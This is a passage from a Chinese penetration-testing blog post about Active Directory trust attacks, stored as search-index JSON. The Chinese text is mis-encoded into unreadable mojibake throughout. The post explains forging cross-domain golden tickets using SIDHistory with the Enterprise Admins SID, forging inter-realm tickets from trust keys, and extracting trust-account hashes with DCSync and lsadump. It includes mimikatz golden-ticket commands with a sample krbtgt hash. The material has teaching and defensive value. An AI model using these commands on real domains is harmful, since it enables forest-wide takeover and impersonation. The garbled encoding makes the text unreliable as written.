ç¥¨æ®ï¼Œç¥¨æ®ä¸­éƒ¨åˆ†ä¿¡æ¯ä½¿ç”¨è¿è¡Œæ–‡ä»¶æœåŠ¡çš„æœåŠ¡è´¦å·çš„å£ä»¤ NTLM å€¼åŠ å¯†; Jack ä½¿ç”¨æ”¶åˆ°çš„ TGS ç¥¨æ®è®¿é—® DC2 ä¸­çš„æ–‡ä»¶æœåŠ¡; æ–‡ä»¶æœåŠ¡çš„æœåŠ¡è´¦å·ä½¿ç”¨å£ä»¤ NTLM å€¼æ ¡éªŒ TGS å½“ 2 ä¸ªåŸŸä¹‹é—´å»ºç«‹ä¿¡ä»»å…³ç³»æ—¶ï¼Œä¼šåœ¨å…¨å±€åŸŸæ•°æ®åº“ä¸­å­˜æ¡£å¯¹æ–¹çš„ SPNã€DNS ç­‰ä¿¡æ¯ï¼Œæ–¹ä¾¿è®¿é—®æ—¶è¿›è¡ŒæŸ¥è¯¢ã€‚ä¾‹å¦‚ï¼Œä¸Šå›¾ä¸­ï¼ŒDC1 ä¼šå­˜æ¡£ DC2 ä¸­æ‰€æœ‰çš„æœåŠ¡ SPNã€DNS ç­‰ä¿¡æ¯ã€‚ å¦‚æœ Jack è¯·æ±‚è®¿é—®çš„æœåŠ¡åœ¨ DC1 çš„å…¨å±€æ•°æ®åº“ä¸­ï¼Œåˆ™ä¼šè¿”å›è½¬æŠ• TGTï¼Œå¦‚æœä¸åœ¨ï¼Œå¦‚æœ DC1 æœ‰çˆ¶åŸŸï¼Œåˆ™ DC1 ä¼šå‘çˆ¶åŸŸè¯·æ±‚ç›´è‡³æ£®æ—çš„æ ¹åŸŸæœåŠ¡å™¨ï¼Œå¦‚æœ DC1 æœ¬èº«æ˜¯æ ¹æœåŠ¡å™¨(æœ¬ä¾‹ä¸­ DC1 æ˜¯æ ¹åŸŸæœåŠ¡å™¨)ï¼Œåˆ™ç›´æ¥å‘Šè¯‰ Jackï¼Œè¯·æ±‚è®¿é—®çš„æœåŠ¡ä¸å­˜åœ¨ã€‚ ä¸€ä¸ªæ£®æ—åªæœ‰ä¸€ä¸ªå…¨å±€æ•°æ®åº“ã€‚ ","date":"2020-05-05","objectID":"/2020/05/%E5%9F%BA%E4%BA%8E%E5%9F%9F%E4%BF%A1%E4%BB%BB%E5%85%B3%E7%B3%BB%E7%9A%84%E5%9F%9F%E6%94%BB%E5%87%BB/:2:0","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","åŸŸä¿¡ä»»å…³ç³»"],"title":"åŸºäºåŸŸä¿¡ä»»å…³ç³»çš„åŸŸæ”»å‡»","uri":"/2020/05/%E5%9F%BA%E4%BA%8E%E5%9F%9F%E4%BF%A1%E4%BB%BB%E5%85%B3%E7%B3%BB%E7%9A%84%E5%9F%9F%E6%94%BB%E5%87%BB/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"SIDHistory ç‰ˆè·¨åŸŸé»„é‡‘ç¥¨æ® åœ¨ä¸€ä¸ªåŸŸä¸­ï¼Œä¸€æ—¦æˆ‘ä»¬è·å– Krbtgt çš„ NTLM å€¼ï¼Œåˆ™å¯ä»¥æ„é€ é»„é‡‘ç¥¨æ®ï¼Œä¼ªé€ æˆåŸŸå†…ä»»æ„ç”¨æˆ·ï¼ŒåŒ…æ‹¬ç®¡ç†å‘˜ï¼Œè·å–å¯¹åŸŸçš„å®Œå…¨è®¿é—®æ§åˆ¶æƒé™ã€‚ä½†æ˜¯åœ¨åŒä¸€ä¸ªæ£®æ—çš„ä¸åŒåŸŸä¸­ï¼Œé»„é‡‘ç¥¨æ®ä¸å†æœ‰æ•ˆã€‚ å›é¡¾ä¸€ä¸‹é»„é‡‘ç¥¨æ®çš„å‡ å¤§è¦ç´ ï¼Œå³åŸŸåã€åŸŸçš„SID(Security Identifier)ã€æœ¬åŸŸ Krbtgt ç”¨æˆ·å£ä»¤ NTLM å€¼ã€æƒ³ä¼ªé€ ç¥¨æ®çš„ç”¨æˆ· RID(Relative Identifierï¼Œåœ¨æ— ç‰¹åˆ«æŒ‡æ˜æƒ…å†µä¸‹ï¼ŒMimikatz å·¥å…·ä¼šè®¾ç½® RID ä¸ºåŸŸç®¡ç†å‘˜çš„ RID)ã€‚ä¸åŒçš„åŸŸæœ‰ä¸åŒçš„ Krbtgtï¼Œå¯¼è‡´é»„é‡‘ç¥¨æ®åœ¨ä¸åŒçš„åŸŸä¹‹é—´å¤±æ•ˆã€‚ mimikatz.exe \"kerberos::golden /user:anyusername /domain:lab.adsec.com /sid:S-1-5-21-2732272027-1570987391-2638982533 /krbtgt:16ed27ee7848756cfa96b33c25e3ad3d /ptt\" exit ä¸åŒçš„åŸŸæœ‰ä¸åŒçš„ Krbtgtï¼Œå¯¼è‡´é»„é‡‘ç¥¨æ®åœ¨ä¸åŒçš„åŸŸä¹‹é—´å¤±æ•ˆã€‚ å¯ä»¥çœ‹åˆ°ï¼Œåœ¨æ„é€  lab.adsec.com åŸŸçš„é»„é‡‘ç¥¨æ®æ—¶ï¼Œåœ¨æœ¬åŸŸä¸­æœ‰æ•ˆï¼Œåˆ°çˆ¶çº§åŸŸ adsec.com ä¸­ç¥¨æ®å¤±æ•ˆã€‚ å¦‚æœä¸€ä¸ªç”¨æˆ·çš„ SIDHistory å±æ€§è¢«è®¾ç½®ä¸ºé«˜æƒé™ç»„æˆ–è€…ç”¨æˆ·çš„ IDï¼Œåˆ™è¯¥ç”¨æˆ·ä¹Ÿå…·å¤‡ç­‰åŒäºé«˜æƒé™ç»„æˆ–è€…ç”¨æˆ·çš„æƒé™ã€‚å¦‚æœæˆ‘ä»¬ä¼ªé€ çš„é»„é‡‘ç¥¨æ®ä¸­åŠ å…¥ç›®æ ‡åŸŸçš„åŸŸç®¡ç†å‘˜ç»„çš„ SIDï¼Œåˆ™å¯ä»¥è·å–ç›®æ ‡åŸŸçš„åŸŸç®¡ç†å‘˜æƒé™ï¼Œé»„é‡‘ç¥¨æ®å’Œ SIDHistory çš„ç»“åˆï¼Œå¯å®ç°è·¨åŸŸé»„é‡‘ç¥¨æ®ã€‚ ç”±äºæ¯ä¸ªåŸŸçš„ SID éƒ½ä¸åŒï¼Œå åŠ  SIDHistory çš„é»„é‡‘ç¥¨æ®ä¸å…·å¤‡é€šç”¨æ€§ã€‚æ ¹æ®å¾®è½¯çš„æè¿°ï¼Œåœ¨åŒä¸€ä¸ªåŸŸæ£®æ—å†…éƒ¨ï¼Œä¼ä¸šç®¡ç†ç»„ EA(Enterprise Administrators) ä¼šè‡ªåŠ¨è¢«æ£®æ—å†…éƒ¨æ‰€æœ‰åŸŸåŠ å…¥åˆ°æœ¬åŸŸçš„åŸŸç®¡ç†å‘˜ç»„ï¼Œä¸” EA åªå­˜åœ¨äºæ ¹åŸŸä¸­ï¼Œæ‰€ä»¥ä¼ä¸šç®¡ç†ç»„ EA çš„ SID å›ºå®šä¸ºæ ¹åŸŸçš„ SID åŠ ä¸Šå›ºå®šçš„ RID å³ 519ã€‚ å› æ­¤ï¼Œå¦‚æœå°†ä½¿ç”¨ä¼ä¸šç®¡ç†ç»„ EA çš„ SID è®¾ç½® SIDHistory å±æ€§ï¼Œå’Œé»„é‡‘ç¥¨æ®ç»“åˆï¼Œåˆ™åœ¨åªè·å–ä»»æ„ä¸€ä¸ªåŸŸ krbtgt è´¦å· NTLM å€¼çš„å‰æä¸‹ï¼Œå¯å®ç°æ£®æ—å†…éƒ¨æ‰€æœ‰åŸŸçš„è·¨åŸŸé»„é‡‘ç¥¨æ®ï¼Œè¿™ç§ç¥¨æ®å¯ç®€ç§°ä¸º SIDHistory ç‰ˆé»„é‡‘ç¥¨æ®ã€‚ å½“ç„¶ä¹Ÿå¯ä»¥æ·»åŠ æ£®æ—å†…æŸä¸ªæŒ‡å®šåŸŸçš„ç®¡ç†å‘˜ç»„ SID ä¸º SIDHistoryï¼Œä½†æ˜¯è¿™æ ·çš„é»„é‡‘ç¥¨æ®åªå¯¹è¯¥æŒ‡å®šåŸŸæœ‰æ•ˆï¼Œå¯¹å…¶ä»–åŸŸæ— æ•ˆã€‚ä¸å¦‚ä½¿ç”¨ä¼ä¸šç®¡ç†å‘˜ SID çš„ç¥¨æ®é‚£æ ·æœ‰é€šç”¨æ€§ã€‚ mimikatz.exe \"kerberos::golden /user:anyusername sids:[EAç»„çš„sid] /sid:[lab.adsec.comåŸŸçš„sid] /domain:lab.adsec.com /krbtgt:16ed27ee7848756cfa96b33c25e3ad3d /ptt\" exit ä»ç„¶åœ¨ lab.adsec.com åŸŸä¸­æ„é€ é»„é‡‘ç¥¨æ®ï¼Œä½†æ·»åŠ äº† SIDS å‚æ•°ï¼Œä½¿ç”¨æ ¹åŸŸçš„ä¼ä¸šç®¡ç†å‘˜ SID ä½œä¸ºå‚æ•°å€¼ï¼Œå³ SIDHistory ç‰ˆé»„é‡‘ç¥¨æ®ï¼Œå¯¹ lab.adsec.com å’Œ adsec.com åŸŸå‡æœ‰æ•ˆã€‚ è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå®ç° SIDHistory ç‰ˆé»„é‡‘ç¥¨æ®çš„åŸºç¡€æ˜¯æ£®æ—å†…ä¿¡ä»»å…³ç³»ï¼Œå› ä¸ºå¦‚æœä¸æ˜¯æ£®æ—å†…ä¿¡ä»»å…³ç³»ï¼Œåˆ™ SIDHistory ä¼šè¢«å¾®è½¯çš„ SID Filter è§„åˆ™è¿‡æ»¤æ‰ï¼Œä»è€Œå¤±æ•ˆï¼Œä½†æ£®æ—å†…éƒ¨ä¸ä¼šæœ‰ SID Filter è§„åˆ™ã€‚è¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆè¯´æ˜¯æ£®æ—è€ŒéåŸŸæ‰æ˜¯å®‰å…¨è¾¹ç•Œã€‚ ","date":"2020-05-05","objectID":"/2020/05/%E5%9F%BA%E4%BA%8E%E5%9F%9F%E4%BF%A1%E4%BB%BB%E5%85%B3%E7%B3%BB%E7%9A%84%E5%9F%9F%E6%94%BB%E5%87%BB/:3:0","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","åŸŸä¿¡ä»»å…³ç³»"],"title":"åŸºäºåŸŸä¿¡ä»»å…³ç³»çš„åŸŸæ”»å‡»","uri":"/2020/05/%E5%9F%BA%E4%BA%8E%E5%9F%9F%E4%BF%A1%E4%BB%BB%E5%85%B3%E7%B3%BB%E7%9A%84%E5%9F%9F%E6%94%BB%E5%87%BB/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"IRKey ç‰ˆè·¨åŸŸé»„é‡‘ç¥¨æ® å½“ 2 ä¸ªåŸŸä¹‹é—´å»ºç«‹åŸŸä¿¡ä»»å…³ç³»æ—¶ï¼Œéœ€è¦å»ºç«‹å…±äº«çš„åŸŸé—´å¯†é’¥(Inter-Realm Keyï¼Œç®€å†™ä¸º IRKey)ï¼Œå…¶ä½œç”¨ç›¸å½“äº Krbtgtï¼Œåªä¸è¿‡æ˜¯ç”¨äºç›¸äº’ä¿¡ä»»çš„ 2 ä¸ªåŸŸä¹‹é—´ï¼Œè€Œ Krbtgt ç”¨äºåŒä¸€ä¸ªåŸŸæœåŠ¡å™¨çš„ AC å’Œ KDC ä¹‹é—´ã€‚ åªè¦è·å–æ£®æ—å†…éƒ¨ä»»æ„åŸŸçš„ krbtgt è´¦å·çš„ NTLM å€¼ï¼Œåˆ™é€šè¿‡ SIDHistory ç‰ˆé»„é‡‘ç¥¨æ®ï¼Œå³å¯è·å–å…¨æ£®æ—æ‰€æœ‰åŸŸçš„æ§åˆ¶æƒã€‚å› æ­¤ä¸ºäº†é˜²å¾¡ï¼Œå¿…é¡» 2 æ¬¡ä¿®æ”¹æ£®æ—å†…éƒ¨æ‰€æœ‰åŸŸçš„ krbtgt è´¦å·çš„ NTLM å€¼ã€‚ åœ¨å¤šåŸŸç¯å¢ƒä¸­ï¼ŒIRKey å’Œä¸»æœºè´¦å·ç±»ä¼¼ï¼Œç³»ç»Ÿé»˜è®¤æ¯ 30 å¤©è‡ªåŠ¨ä¿®æ”¹ä¸€æ¬¡ NTLMã€‚æ‰€ä»¥å³ä½¿ 2 æ¬¡ä¿®æ”¹æ£®æ—å†…æ‰€æœ‰åŸŸçš„ krbtgt è´¦å·çš„ NTLMï¼ŒIRKey çš„ NTLM å¤§æ¦‚ç‡ä»ç„¶æ²¡æœ‰å‘ç”Ÿæ”¹å˜(å°æ¦‚ç‡æ˜¯ krbtgt çš„ NTLM ä¿®æ”¹æ­£å¥½ç¢°ä¸Šäº† IRKey çš„ä¿®æ”¹å‘¨æœŸ)ã€‚ ç±»ä¼¼ç™½é“¶ç¥¨æ®ï¼Œå¯ä»¥ä½¿ç”¨ IRKey ä¼ªé€ åŸŸé—´å¯è½¬æŠ•ç¥¨æ®(Inter-Realm Referral TGT)ï¼Œè·å–ç›®æ ‡åŸŸçš„åŸŸç®¡ç†å‘˜æƒé™ï¼Œå†ç»“åˆä¸Šä¸€èŠ‚çš„ SIDHistory ç‰ˆé»„é‡‘ç¥¨æ®ï¼Œå†æ¬¡è·å–æ•´ä¸ªæ£®æ—çš„æ§åˆ¶æƒã€‚è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯ SID ä¸ºç›®æ ‡åŸŸçš„ SIDã€‚ åœ¨åŸŸä¸­ï¼Œå¤§éƒ¨åˆ†å¸¦ â€˜$â€™ ç¬¦å·çš„è´¦å·ä¸º Computer è´¦å·ï¼Œä½†æ˜¯ User ç»„å¸¦ â€˜$â€™ ç¬¦å·çš„è´¦å·ä¸ºä¿¡ä»»è´¦å·ï¼Œå¯ä»¥é€šè¿‡åŸŸæœåŠ¡å™¨è‡ªå¸¦çš„ Powershell å‘½ä»¤ Get-ADUser è·å–æ‰€æœ‰ å¸¦ â€˜$â€™ ç¬¦å·çš„ User è´¦å·ï¼Œä¸‹å›¾ä¸­ ADSEC$ è´¦å·ä¸ºä¿¡ä»»è´¦å·ï¼Œéš¶å±äº Users ç»„ã€‚ æœ‰ 2 ç§æ–¹å¼å¯ä»¥è·å–ä¿¡ä»»è´¦å·çš„ NTLM å€¼ã€‚ ","date":"2020-05-05","objectID":"/2020/05/%E5%9F%BA%E4%BA%8E%E5%9F%9F%E4%BF%A1%E4%BB%BB%E5%85%B3%E7%B3%BB%E7%9A%84%E5%9F%9F%E6%94%BB%E5%87%BB/:4:0","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","åŸŸä¿¡ä»»å…³ç³»"],"title":"åŸºäºåŸŸä¿¡ä»»å…³ç³»çš„åŸŸæ”»å‡»","uri":"/2020/05/%E5%9F%BA%E4%BA%8E%E5%9F%9F%E4%BF%A1%E4%BB%BB%E5%85%B3%E7%B3%BB%E7%9A%84%E5%9F%9F%E6%94%BB%E5%87%BB/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"Dcsync è·å–ä¿¡ä»»è´¦å·çš„ NTLM å€¼ ä¸‹å›¾é‡‡ç”¨ Dcsync æ–¹å¼ï¼Œè·å– lab.adsec.com åŸŸä¸­ä¿¡ä»»è´¦å· adsec$ çš„ NTLM å€¼ï¼Œç»“æœè¡¨æ˜è¯¥è´¦å·çš„ç±»å‹ä¸º TRUST_ACCOUNT ","date":"2020-05-05","objectID":"/2020/05/%E5%9F%BA%E4%BA%8E%E5%9F%9F%E4%BF%A1%E4%BB%BB%E5%85%B3%E7%B3%BB%E7%9A%84%E5%9F%9F%E6%94%BB%E5%87%BB/:4:1","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","åŸŸä¿¡ä»»å…³ç³»"],"title":"åŸºäºåŸŸä¿¡ä»»å…³ç³»çš„åŸŸæ”»å‡»","uri":"/2020/05/%E5%9F%BA%E4%BA%8E%E5%9F%9F%E4%BF%A1%E4%BB%BB%E5%85%B3%E7%B3%BB%E7%9A%84%E5%9F%9F%E6%94%BB%E5%87%BB/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"lsadum è·å–ä¿¡ä»»è´¦å·çš„ NTLM å€¼ é‡‡ç”¨ lsadump::trust /patchæ–¹å¼ã€‚ä»ä¸‹å›¾ä¸­å¯çœ‹åˆ°æœ‰ [IN] LAB.ADSEC.COM -\u003e ADSEC.COM å’Œ [OUT] ADSEC.COM -\u003e LAB.ADSEC.COM ä¸¤ç§ä¸åŒçš„ NTLM å€¼ï¼Œåˆ†åˆ«æ˜¯å¾€å¤–åˆ°å…¶ä»–åŸŸå’Œå¾€å†…åˆ°æœ¬åŸŸè®¿é—®æ—¶ç”¨åˆ°çš„å€¼ã€‚å› ä¸ºåŒå‘ä¿¡ä»»å…³ç³»å…¶å®æ˜¯ 2 ä¸ªå•å‘ä¿¡ä»»å…³ç³»çš„å åŠ ï¼Œæ‰€ä»¥ä¼šæœ‰ 2 ä¸ªå¯†é’¥ã€‚è¿™é‡Œæˆ‘ä»¬è¦ä»æœ¬åŸŸæ„é€  IRKey ç‰ˆé»„é‡‘ç¥¨æ®è®¿é—®æ£®æ—å†…éƒ¨å…¶ä»–åŸŸï¼Œæ‰€ä»¥ä½¿ç”¨ IN è¿™ä¸ª NTLM å€¼ã€‚ ç”±äº IRKey å­˜åœ¨äºæ£®æ—å†…éƒ¨çš„ä¿¡ä»»åŸŸä¹‹é—´ï¼Œä¹Ÿå­˜åœ¨äºæ£®æ—å¤–éƒ¨çš„æ£®æ—ä¹‹é—´ï¼Œå‡å¯ç”¨äºè½¬æŠ•è®¤è¯ã€‚åœ¨ SIDHistory ç‰ˆé»„é‡‘ç¥¨æ®ä¸­ï¼Œç”±äº SID Filter è§„åˆ™ï¼Œåœ¨æ£®æ—ä¹‹é—´ä¸èƒ½ä½¿ç”¨ï¼Œä½†æ˜¯ IRKey ç‰ˆä¸æ¶‰åŠè¿™ä¸ªå®‰å…¨è¿‡æ»¤è§„åˆ™ï¼Œä»ç„¶æœ‰æ•ˆã€‚IRKey ç‰ˆé»„é‡‘ç¥¨æ®å¯ä»¥åˆ†ä½œæ£®æ—å†…éƒ¨çš„ã€æ£®æ—å¤–éƒ¨çš„ 2 ç§ï¼Œæ“ä½œæ–¹æ³•ç±»ä¼¼ï¼Œè¿™é‡Œæˆ‘ä»¬ç€é‡ä»‹ç»æ£®æ—å†…éƒ¨çš„ IRKey ç‰ˆé»„é‡‘ç¥¨æ®ã€‚ åŸŸé—´è½¬æŠ•ç¥¨æ®çš„è®¤è¯ï¼Œä¾é  IRKey åŠ å¯†ã€‚åœ¨æˆ‘ä»¬å·²çŸ¥ IRKey çš„å‰æä¸‹ï¼Œå¯ä»¥ä¼ªé€ æŒæœ‰è¯¥ IRKey çš„ä¿¡ä»»åŸŸçš„ä»»æ„ç”¨æˆ·ã€‚æµ‹è¯•ä¸­ï¼Œæˆ‘ä»¬æ„é€ ä¸€ä¸ªç¥¨æ®ï¼Œå‘Šè¯‰ adsec.com åŸŸï¼Œè½¬æŠ•è®¤è¯çš„ç”¨æˆ·ä¸º administratorï¼Œè€Œä¸” SIDHistory ä¸ºæ ¹åŸŸçš„ä¼ä¸šç®¡ç†å‘˜ã€‚ æ„é€ æˆåŠŸåï¼Œå…·å¤‡ adsec.com çš„ç®¡ç†å‘˜æƒé™ï¼Œä½†æ˜¯ä¸èƒ½é«˜æƒé™è®¿é—® lab.adsec.comï¼Œå› ä¸ºæ„é€ çš„ç¥¨æ®æ˜¯åˆ° adsec.com åŸŸçš„ç®¡ç†å‘˜ç¥¨æ®ã€‚åœ¨è·å– adsec.com åŸŸçš„é«˜æƒé™åï¼Œå¯ä»¥è·å–è¯¥åŸŸçš„ krbtgt è´¦å·çš„ NTLM å€¼ï¼Œåœ¨æ­¤åŸºç¡€ä¸Šï¼Œç»§ç»­æ„é€  SIDHistory ç‰ˆé»„é‡‘ç¥¨æ®ï¼Œä»è€Œå¯ä»¥è·å–æ•´ä¸ªæ£®æ—çš„æ§åˆ¶æƒã€‚ ","date":"2020-05-05","objectID":"/2020/05/%E5%9F%BA%E4%BA%8E%E5%9F%9F%E4%BF%A1%E4%BB%BB%E5%85%B3%E7%B3%BB%E7%9A%84%E5%9F%9F%E6%94%BB%E5%87%BB/:4:2","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","åŸŸä¿¡ä»»å…³ç³»"],"title":"åŸºäºåŸŸä¿¡ä»»å…³ç³»çš„åŸŸæ”»å‡»","uri":"/2020/05/%E5%9F%BA%E4%BA%8E%E5%9F%9F%E4%BF%A1%E4%BB%BB%E5%85%B3%E7%B3%BB%E7%9A%84%E5%9F%9F%E6%94%BB%E5%87%BB/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"åŸŸä¿¡ä»»å…³ç³»çš„è·å– åœ¨å¤§å‹åŸŸç½‘ç»œä¸­ï¼Œå› ä¸ºå…¬å¸å¹¶è´­ã€ä¼ä¸šé‡ç»„ã€ä¸šåŠ¡æ‰©å±•ç­‰å„ç§åŸå› ï¼ŒåŸŸç½‘ç»œçš„ç»„ç»‡æ¨¡å¼ã€ä¿¡ä»»å…³ç³»å„æœ‰ä¸åŒã€‚è¿™äº›ä¸åŒçš„ä¿¡ä»»å…³ç³»ï¼Œå‡å­˜æ”¾åœ¨æ£®æ—æ ¹åŸŸçš„æ•°æ®åº“ä¸­(Global Catalog)ï¼Œæœ‰å¤šç§æ–¹å¼å¯ä»¥è·å–è¿™äº›æ•°æ® PowerViewã€BloodHound å·¥å…·åˆ†åˆ«æä¾›äº†å¤šç§è·å–åŸŸä¿¡ä»»å…³ç³»çš„æ–¹å¼ï¼Œä¸”èƒ½å¯è§†åŒ–ä¿¡ä»»å…³ç³»ã€‚ä¸‹é¢å°†ä»‹ç»ä»æ£®æ—å†…éƒ¨çš„æŸä¸ªå­åŸŸçš„ä¸»æœºï¼Œè·å–æ•´ä¸ªæ£®æ—ä¿¡ä»»å…³ç³»çš„æ–¹æ³•å’Œè¿‡ç¨‹ã€‚ Powerview: å…ˆä½¿ç”¨ Get-NetForestTrust å‘½ä»¤è·å–æ£®æ—çº§åˆ«çš„ä¿¡ä»»å…³ç³»ï¼Œå…±æœ‰ 2 ä¸ªæ£®æ—ï¼Œåˆ†åˆ«ä¸º adsec.comã€testlab.comï¼Œ2 ä¸ªæ£®æ—å»ºç«‹äº†åŒå‘ä¿¡ä»»å…³ç³» ä½¿ç”¨ Get-NetDomainTrust å‘½ä»¤è·å– adsec.com åŸŸçš„åŸŸçº§åˆ«ä¿¡ä»»å…³ç³»ï¼Œå³æ£®æ—å†…éƒ¨å…³ç³»ï¼Œæœ‰åˆ° lab.adsec.com çš„ ParentChild ä¿¡ä»»å…³ç³»å’Œåˆ° res.com åŸŸçš„ TreeRoot ä¸¤ç§æ£®æ—å†…éƒ¨å…³ç³»ã€‚ æµ‹è¯•ä¸­ï¼ŒGet-NetDomainTrust çš„å‚æ•° adsec.com è¡¨ç¤ºæŸ¥è¯¢æŒ‡å®šåŸŸä¸Šçš„ä¿¡ä»»å…³ç³»ï¼Œä¸€èˆ¬æƒ…å†µä¸‹ï¼Œåªè¦æŒ‡å®šçš„åŸŸä¿¡ä»»å½“å‰æŸ¥è¯¢ä¸»æœºæ‰€åœ¨çš„åŸŸï¼Œå°±å¯ä»¥è·å–å¯¹æ–¹çš„ä¿¡ä»»å…³ç³»æ•°æ®ã€‚ åœ¨æŸ¥è¯¢æ—¶å¯ä»¥ä½¿ç”¨ Export-CSV -NoTypeInformation å°†è¾“å‡ºç»“æœè½¬æ¢ä¸º CSV æ ¼å¼ï¼Œå‘½ä»¤ä¸º Get-DomainTrustMapping -API | Export-CSV -NoTypeInformation trusts-mapping.csvã€‚ç„¶åä½¿ç”¨ TrustVisualizer å·¥å…·è¿›è¡Œå¯è§†åŒ–è¾“å‡ºã€‚æœ€åä½¿ç”¨ yED å·¥å…·è½¬æ¢ä¸ºå¯è§†åŒ–å›¾å½¢ã€‚ ","date":"2020-05-05","objectID":"/2020/05/%E5%9F%BA%E4%BA%8E%E5%9F%9F%E4%BF%A1%E4%BB%BB%E5%85%B3%E7%B3%BB%E7%9A%84%E5%9F%9F%E6%94%BB%E5%87%BB/:5:0","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","åŸŸä¿¡ä»»å…³ç³»"],"title":"åŸºäºåŸŸä¿¡ä»»å…³ç³»çš„åŸŸæ”»å‡»","uri":"/2020/05/%E5%9F%BA%E4%BA%8E%E5%9F%9F%E4%BF%A1%E4%BB%BB%E5%85%B3%E7%B3%BB%E7%9A%84%E5%9F%9F%E6%94%BB%E5%87%BB/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"åˆ©ç”¨åŸŸä¿¡ä»»å®ç°è·¨åŸŸæ”»å‡» å¦‚æœä¸€ä¸ªåŸŸå†…ç”¨æˆ·(å‡è®¾ç”¨æˆ·ä¸º eviluser)æƒ³è®¿é—®å…¶ä»–åŸŸçš„èµ„æºè®¿é—®ï¼Œé¦–å…ˆç¡®ä¿ç›®æ ‡åŸŸä¿¡ä»»å½“å‰ç”¨æˆ·æ‰€åœ¨çš„åŸŸï¼Œè¿™æ˜¯åŸºæœ¬å‰æï¼Œç„¶åå¿…é¡»å…·å¤‡ä»¥ä¸‹3ä¸ªæ¡ä»¶ä¹‹ä¸€ eviluser è¢«ç›®æ ‡åŸŸåŠ å…¥äº†æŸä¸ªç»„ï¼Œè¿™ä¸ªç»„åœ¨ç›®æ ‡åŸŸä¸­å…·æœ‰èµ„æºè®¿é—®æƒé™; eviluser è¢«ç›®æ ‡åŸŸä¸­çš„æŸäº›ä¸»æœºæˆ–æœåŠ¡å™¨æ·»åŠ ä¸ºæœ¬åœ°ç»„ï¼Œä¾‹å¦‚è¢«æŸå°æœåŠ¡å™¨æ·»åŠ ä¸ºæœ¬åœ°ç®¡ç†å‘˜ç»„; å½“å‰ç”¨æˆ·è¢«ç›®æ ‡åŸŸçš„æŸäº›åŸŸå¯¹è±¡æ·»åŠ ä¸ºè®¿é—®æ§åˆ¶ ACL çš„å®‰å…¨ä¸»ä½“(Security Principal)ï¼Œä¾‹å¦‚å¯ä»¥ä¿®æ”¹æŸä¸ªåŸŸç”¨æˆ·å¯¹è±¡çš„å£ä»¤ ä¹Ÿè®¸æœ‰äººç–‘é—®ï¼Œæ ¹æ®å‰é¢ä»‹ç»çš„å†…å®¹ï¼Œæ—¢ç„¶åªè¦è·å–äº†å½“å‰åŸŸçš„ Krbtgt è´¦å·æˆ–è€… IRKey è´¦å·çš„ NTLM å€¼ï¼Œ å³å¯è·å–æ•´ä¸ªæ£®æ—çš„æ§åˆ¶æƒï¼Œé‚£æ²¡æœ‰å¿…è¦å†ä»‹ç»æ£®æ—å†…éƒ¨çš„è·¨åŸŸæ”»å‡» è¿™æ˜¯å› ä¸ºåœ¨å®é™…æƒ…å†µä¸­ï¼Œå¹¶ä¸ä¸€å®šèƒ½é¡ºåˆ©è·å–æŸä¸ªåŸŸçš„ Krbtgt è´¦å·æˆ–è€… IRKey è´¦å·çš„ NTLM å€¼ï¼Œä¾‹å¦‚åŸŸèµ„æºå°‘ã€é…ç½®ä¸¥è°¨ã€ç³»ç»Ÿæ›´æ–°åŠæ—¶ç­‰ï¼Œè¿™æ—¶éœ€è¦ç»•é“è‡³æ›´å¤§çš„åŸŸï¼Œæ‰æœ‰æ›´å¤šçš„æœºä¼šè·å– Krbtgt è´¦å·æˆ–è€… IRKey è´¦å·çš„ NTLM å€¼ï¼Œå› ä¸ºèµ„æºè¶Šå¤šï¼Œå­˜åœ¨è„†å¼±ç‚¹çš„æ¦‚ç‡è¶Šå¤§ è¦å®ç°ä»å½“å‰ç”¨æˆ· eviluser å¼€å§‹ï¼Œè·¨åŸŸæ”»å‡» A åŸŸï¼Œé¦–å…ˆå¾—ç¡®ä¿å½“å‰ç”¨æˆ·å…·å¤‡è·¨åŸŸè®¿é—® A åŸŸèµ„æºçš„æƒé™ï¼Œæ‰€ä»¥æ”»å‡»ç¯èŠ‚åº”è¯¥åŒ…æ‹¬å‡ ä¸ªæ­¥éª¤ ä»å½“å‰åŸŸçš„æ•°æ®åº“ä¸­ï¼Œæšä¸¾æœ‰å“ªäº›åŸŸä¿¡ä»»å½“å‰åŸŸ (å‡º)ï¼Œç”±äºæ˜¯æ”»å‡»å…¶ä»–åŸŸï¼Œæ‰€ä»¥ä¸ç”¨å…³æ³¨å½“å‰åŸŸä¿¡ä»»å“ªäº›å¤–éƒ¨åŸŸ(å…¥)ï¼Œè¿™ä»ä¸Šä¸€èŠ‚ä»‹ç»çš„æ–¹æ³•å¯ä»¥è½»æ¾è·å– åˆ©ç”¨ä¿¡ä»»å…³ç³»ï¼Œæšä¸¾ç›®æ ‡åŸŸä¸­å“ªäº›ç»„åŒ…å«å¤–æ¥åŸŸçš„ç”¨æˆ·ã€‚è¿™é‡Œéœ€è¦ç‰¹åˆ«è§£é‡Šä¸€ç‚¹çš„æ˜¯ï¼Œåœ¨åŸŸå†…é€šå¸¸æœ‰ 3 ç§ ç±»å‹çš„ç»„ï¼Œç¬¬ 1 ç§æ˜¯åŸŸæœ¬åœ°ç»„(Domain Local Groups)ï¼Œå¯ä»¥æ·»åŠ è·¨åŸŸã€è·¨æ£®æ—çš„ç»„æˆå‘˜ï¼Œä¹Ÿæ˜¯æœ€å¸¸è§çš„ç»„ï¼›ç¬¬ 2 ç§æ˜¯å…¨å±€ç»„(Global Groups)ï¼Œä¸å…è®¸æœ‰ä»»ä½•è·¨åŸŸç»„æˆå‘˜ï¼Œå³ä½¿æ˜¯åŒä¸€ä¸ªæ£®æ—ä¹Ÿä¸å¯ä»¥ï¼Œæƒé™è¾ƒé«˜ï¼Œä¾‹å¦‚ä¼ä¸šç®¡ç†ç»„ï¼›ç¬¬ 3 ç§æ˜¯é€šç”¨ç»„(Universal 